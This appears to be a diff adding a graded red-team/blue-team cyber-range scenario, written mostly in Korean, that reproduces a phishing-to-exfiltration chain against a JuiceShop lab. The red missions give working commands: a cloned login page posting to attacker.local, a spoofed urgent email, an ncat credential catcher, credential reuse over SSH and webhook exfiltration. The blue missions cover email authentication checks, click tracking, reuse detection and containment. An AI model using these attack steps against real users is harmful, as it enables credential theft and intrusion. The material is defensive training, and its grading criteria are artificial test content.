@@ -1,0 +1,239 @@
+id: "precinct6-phishing"
+title: "Precinct 6 Phishing 재현 — credential theft → lateral chain"
+description: "WitFoo Precinct 6 Cybersecurity Dataset 의 mo_name='Phishing' 패턴 (T1566 Phishing → T1078 Valid Accounts → T1083 File and Directory Discovery → T1567 Exfiltration over Web Service) 을 cyber range 에서 재현. Red Team 은 phishing email + credential harvesting + 추출 자격증명으로 lateral movement 수행. Blue Team 은 SEG (Secure Email Gateway) 탐지·SPF/DKIM/DMARC 검증·user click telemetry·credential reuse 탐지."
+difficulty: "hard"
+time_limit: 3600
+battle_type: "1v1"
+
+red_missions:
+  - order: 1
+    instruction: "Phishing landing page 작성 — JuiceShop 로그인을 모사한 가짜 페이지 (Precinct case 의 attacker infrastructure 등장 단계 재현)."
+    hint: "cat > /tmp/phish.html <<'EOF'\n<!DOCTYPE html><html><body><h1>JuiceShop Login</h1>\n<form action=\"http://attacker.local/collect\" method=\"POST\">\n<input name=\"email\" placeholder=\"Email\"><input name=\"password\" type=\"password\">\n<button>Sign in</button></form></body></html>\nEOF\npython3 -m http.server 8000 --directory /tmp &"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "form"
+      semantic:
+        intent: "MITRE T1566.002 (Spearphishing Link) — 정당한 사이트 모사한 credential capture 페이지. Precinct Case 의 first_observed_at 단계."
+        success_criteria:
+          - "HTML 폼 작성 (input email/password + form action 외부 endpoint)"
+          - "로그인 화면 모사 (JuiceShop 또는 동등 브랜드)"
+          - "정적 server (python http.server / nginx) 로 접근 가능 확인"
+        acceptable_methods:
+          - "cat heredoc + python -m http.server"
+          - "Gophish 캠페인"
+          - "evilginx2 reverse-proxy phishing"
+          - "Modlishka 자동화"
+        negative_signs:
+          - "단일 페이지 + 폼 없음 → credential capture 불가"
+          - "form action 누락 또는 같은 origin"
+
+  - order: 2
+    instruction: "Phishing email 작성 — 실 사용자에게 발송할 phishing email body (T1566.001 Spearphishing Attachment 또는 .002 Link)."
+    hint: "cat > /tmp/phish-mail.txt <<'EOF'\nFrom: security@juiceshop-alerts.com\nSubject: [긴급] 계정 보안 점검 필요\n\n귀하의 JuiceShop 계정에 비정상 접근이 감지되었습니다.\n다음 링크에서 비밀번호를 즉시 변경해주세요: http://attacker.local:8000/phish.html\n실패 시 24시간 이내 계정이 잠깁니다.\n-- JuiceShop 보안팀\nEOF\ncat /tmp/phish-mail.txt"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "phish"
+      semantic:
+        intent: "MITRE T1566 — 사회공학 트리거 (긴급성·신뢰성 위장·작용 강제). Precinct case 의 user-targeting 단계."
+        success_criteria:
+          - "From 헤더 위장 (typosquatting domain 또는 spoofed display name)"
+          - "긴급성 강요 (24h 잠금 / 즉시 / 보안 점검)"
+          - "phishing link URL 포함 + landing page 와 정합"
+        acceptable_methods:
+          - "manual email body 작성"
+          - "GoPhish template"
+          - "King Phisher 캠페인"
+          - "SET (Social Engineer Toolkit)"
+        negative_signs:
+          - "도메인 위장 없음 → SEG 1차 차단"
+          - "긴급성 없음 → 클릭률 저조"
+          - "링크가 landing 과 다름"
+
+  - order: 3
+    instruction: "Credential capture 시뮬레이션 — 사용자가 입력한 credential 을 attacker 로그에 수집 (Precinct case 의 credential theft)."
+    hint: "ncat -lvkp 80 --recv-only > /tmp/captured-creds.log &\ncurl -s -X POST -d 'email=victim@juiceshop.local&password=Summer2026!' http://localhost:80/collect 2>&1 | head\ncat /tmp/captured-creds.log | grep -E 'email|password' | head"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "password"
+      semantic:
+        intent: "MITRE T1056.003 (Web Portal Capture) — phishing form submission 으로 credential 수집. Precinct case 의 credential exfiltration 단계."
+        success_criteria:
+          - "수신 endpoint (ncat/python flask/nginx) 가동 + log 기록"
+          - "captured POST body 에 email/password key 명시"
+          - "최소 1건 credential 캡처 입증"
+        acceptable_methods:
+          - "ncat -lvkp + recv-only"
+          - "Flask /collect endpoint"
+          - "PHP file_get_contents('php://input')"
+          - "logstash beats input"
+        negative_signs:
+          - "endpoint listen 만 + 실제 수집 입증 없음"
+          - "POST body 파싱 누락"
+
+  - order: 4
+    instruction: "수집한 credential 로 lateral — JuiceShop 또는 SSH 에 재사용 시도 (Precinct case 의 T1078 Valid Accounts)."
+    hint: "curl -i -X POST -H 'Content-Type: application/json' -d '{\"email\":\"victim@juiceshop.local\",\"password\":\"Summer2026!\"}' http://10.20.30.80:3000/rest/user/login\necho '---'\nsshpass -p 'Summer2026!' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 victim@10.20.30.80 'whoami; hostname' 2>&1 | head"
+    points: 20
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "login"
+      semantic:
+        intent: "MITRE T1078 (Valid Accounts) — phishing 으로 획득한 자격증명 으로 정당한 인증 흐름 통과. Precinct case 의 lateral 진입."
+        success_criteria:
+          - "수집 credential 로 1개 이상 서비스 (JuiceShop API / SSH) 인증 시도"
+          - "200/Authorization Bearer token 획득 또는 명백한 거부 응답 분석"
+          - "credential 재사용 위험 (동일 password 다중 서비스) 명시"
+        acceptable_methods:
+          - "curl REST login + token 분석"
+          - "sshpass + ssh"
+          - "smbclient -U user%pass"
+          - "MS Graph API (M365 phishing)"
+        negative_signs:
+          - "단일 서비스만 + 다른 서비스 재사용 미확인"
+          - "응답 분석 누락"
+
+  - order: 5
+    instruction: "Exfiltration via legitimate web service — Slack/Discord/Telegram webhook 으로 수집 데이터 전송 (Precinct case 의 T1567)."
+    hint: "echo 'victim@juiceshop.local:Summer2026!' | curl -s -X POST -H 'Content-Type: application/json' --data-binary '{\"text\":\"'\"$(cat /tmp/captured-creds.log | head)\"'\"}' http://localhost:8080/webhook-stub\necho 'sent'"
+    points: 15
+    target_vm: attacker
+    verify:
+      type: "output_contains"
+      expect: "sent"
+      semantic:
+        intent: "MITRE T1567.002 (Exfiltration to Cloud Storage) / T1041 (Exfiltration over C2) — 정당한 outbound 채널 (HTTPS) 로 위장한 credential exfil. Precinct case 의 final exfiltration."
+        success_criteria:
+          - "정상 outbound 채널 (HTTPS POST / DNS query / TLS encrypted) 사용"
+          - "captured-creds 데이터를 webhook payload 에 포함"
+          - "응답 200 또는 sent 확인"
+        acceptable_methods:
+          - "Slack/Discord/Teams webhook"
+          - "Telegram bot API"
+          - "GitHub Gist API"
+          - "DNS TXT record exfil (dnscat2)"
+        negative_signs:
+          - "raw TCP 외부 연결 → easy detect"
+          - "data payload 누락 → exfil 입증 안 됨"
+
+blue_missions:
+  - order: 1
+    instruction: "SEG (Secure Email Gateway) 차원 — phishing email 의 SPF/DKIM/DMARC 검증 + 평판 분석 (Precinct case 의 first_observed_at 1차 차단)."
+    hint: "ssh ccc@10.20.30.100 'echo phishing 헤더 분석; head -50 /var/log/mail.log 2>/dev/null || echo no_mail_log; dig juiceshop-alerts.com TXT +short; dig juiceshop-alerts.com MX +short; whois juiceshop-alerts.com 2>&1 | grep -E \"Created|Registrar\" | head'"
+    points: 20
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "alerts"
+      semantic:
+        intent: "MITRE M1054 (Software Configuration) — SPF/DKIM/DMARC 검증 + typosquatting 도메인 탐지로 phishing email 1차 차단. Precinct case 의 SEG layer."
+        success_criteria:
+          - "From 헤더의 도메인 (juiceshop-alerts.com) SPF/DKIM/DMARC TXT 조회"
+          - "도메인 등록일·registrar 확인 (최근 등록 = 의심)"
+          - "MX 레코드 정합성 검증"
+        acceptable_methods:
+          - "dig TXT/MX + whois"
+          - "Proofpoint/Mimecast SEG dashboard"
+          - "Microsoft Defender for Office 365 reports"
+          - "Gmail header analyzer"
+        negative_signs:
+          - "도메인 분석 만 + 헤더 검증 누락"
+          - "단일 record 만 + 다중 검증 누락"
+
+  - order: 2
+    instruction: "User click telemetry — proxy log 에서 phishing URL 클릭 사용자 식별 (Precinct case 의 T1566 click 감지)."
+    hint: "ssh ccc@10.20.30.100 'tail -2000 /var/log/squid/access.log 2>/dev/null | grep -E \"phish|attacker.local|juiceshop-alerts\" | awk \"{print \\$3, \\$7, \\$8}\" | sort -u | head -20'"
+    points: 20
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "phish"
+      semantic:
+        intent: "MITRE M1031 (Network Intrusion Prevention) + DLP — 사용자 web traffic 에서 phishing URL 클릭 추적. Precinct case 의 'who clicked' 식별."
+        success_criteria:
+          - "proxy/PAC log 에서 phishing 도메인 GET 추출"
+          - "src IP/user agent 별 클릭자 명시"
+          - "최소 1건 phishing URL access 식별"
+        acceptable_methods:
+          - "Squid access.log + awk"
+          - "Bluecoat/Zscaler/Netskope dashboard"
+          - "Microsoft Defender for Endpoint (DeviceNetworkEvents)"
+          - "Palo Alto URL filtering log"
+        negative_signs:
+          - "log dump + filter 누락"
+          - "URL 만 + 클릭 사용자 누락"
+
+  - order: 3
+    instruction: "Credential reuse anomaly — 동일 user 가 짧은 시간 내 다중 서비스 로그인 시도 탐지 (Precinct case 의 T1078 탐지 hook)."
+    hint: "ssh ccc@10.20.30.100 'tail -5000 /var/ossec/logs/alerts/alerts.log 2>/dev/null | grep -E \"login|authentication\" | awk \"{for(i=1;i<=NF;i++) if(\\$i ~ /victim/) print \\$0}\" | head -10; echo ---; ss -tan state established | grep -E \":3000|:22\" | head'"
+    points: 15
+    target_vm: siem
+    verify:
+      type: "output_contains"
+      expect: "login"
+      semantic:
+        intent: "MITRE T1078 detection — 같은 credential 이 여러 서비스/지역에서 짧은 시간 내 사용되는 anomaly 추출. Precinct case 의 lateral detection."
+        success_criteria:
+          - "Wazuh alerts 또는 application audit log 에서 multi-service login 추출"
+          - "user/email 키 동일 + 서비스 다른 케이스 그룹화"
+          - "시간 간격 (예 5분 이내) 명시"
+        acceptable_methods:
+          - "Wazuh alerts.log + grep"
+          - "ELK SIEM correlation rule"
+          - "Splunk UBA risk score"
+          - "Microsoft Sentinel risky sign-in"
+        negative_signs:
+          - "login event dump + 사용자 그룹화 누락"
+          - "single service 만 + cross-service 검증 누락"
+
+  - order: 4
+    instruction: "MFA enforce + password 강제 reset — 노출 의심 user 의 자격증명 무효화 (Precinct case 의 containment)."
+    hint: "ssh ccc@10.20.30.80 'echo \"DRY-RUN: passwd victim --expire\"; echo \"DRY-RUN: kill all sessions for victim\"; echo \"DRY-RUN: enforce MFA: az ad user update --id victim@juiceshop.local --force-change-password-next-login true\" 2>/dev/null'"
+    points: 15
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "expire"
+      semantic:
+        intent: "MITRE M1032 (Multi-factor Authentication) + M1027 (Password Policies) — 노출 자격증명 즉시 무효화 + MFA 강제."
+        success_criteria:
+          - "passwd --expire 또는 동등 명령으로 다음 로그인 시 변경 강제"
+          - "기존 활성 세션 모두 강제 종료 (sessions kill 또는 token revoke)"
+          - "MFA 강제 enforcement (Azure AD / Okta / Duo)"
+        acceptable_methods:
+          - "passwd --expire + pkill -u user"
+          - "Azure AD: Set-MsolUserPassword + ForceChangePassword"
+          - "Okta: revoke all OAuth tokens"
+          - "Auth0: invalidate sessions API"
+        negative_signs:
+          - "passwd reset 만 + session kill 누락"
+          - "MFA enforcement 누락 → 재공격 시 동일 위험"
+
+  - order: 5
+    instruction: "사용자 인지 교육 + phishing simulation 결과 (Precinct case 의 long-term mitigation + DPIA)."
+    hint: "ssh ccc@10.20.30.80 'cat > /tmp/phishing-incident-report.md <<EOF\n# Phishing Incident Report $(date +%Y-%m-%d)\n## 영향 범위\n- 클릭 사용자: 1명 (victim@juiceshop.local)\n- 노출 자격증명: email/password 1건\n- 재사용 시도: 2건 (JuiceShop API + SSH)\n## Containment\n- password expire + MFA enforce\n- session revoke\n## Long-term\n- KnowBe4 phishing simulation 분기별 1회\n- SEG rule: typosquatting domain 자동 차단\nEOF\nsha256sum /tmp/phishing-incident-report.md'"
+    points: 20
+    target_vm: web
+    verify:
+      type: "output_contains"
+      expect: "sha256"
+      semantic:
+        intent: "GDPR Article 33/34 + ISO 27035 — incident report + chain-of-custody + 사용자 교육 계획. Precinct case 의 ttl 기반 long-term retention."
+        success_criteria:
+          - "incident report 작성 (영향 범위 + containment + long-term)"
+          - "sha256 hash 로 무결성 보장"
+          - "재발 방지 (KnowBe4 simulation / SEG rule / SOC playbook) 명시"
+        acceptable_methods:
+          - "manual report + sha256sum"
+          - "ServiceNow IRT ticket"
+          - "Atlassian Jira incident workflow"
+          - "TheHive case management"
+        negative_signs:
+          - "report 만 + hash 누락"
+          - "containment 만 + long-term mitigation 누락"
